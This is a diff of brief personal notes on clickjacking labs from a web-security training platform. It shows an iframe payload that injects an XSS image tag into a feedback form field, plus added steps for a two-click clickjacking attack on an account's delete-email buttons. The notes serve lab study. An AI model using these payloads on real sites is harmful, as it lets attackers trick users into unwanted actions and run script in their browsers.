@@ -38,3 +38,13 @@ NOTE:-  For clickjacking , use Burp's Clickbandit tool.
 #4 Lab:- Exploiting clickjacking vulnerability to trigger DOM-based XSS
 
       1.append at last line <iframe src ="https://.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+
+
+------------------------------------------------------------------------------------
+
+#5 Lab:- Multistep clickjacking
+
+      1.instead of one click add another click also in exploit server iframe
+      2.first click will be on "delete email" button and second click will be on "confirm email delete" button
+
+------------------------------------------------------------------------------------
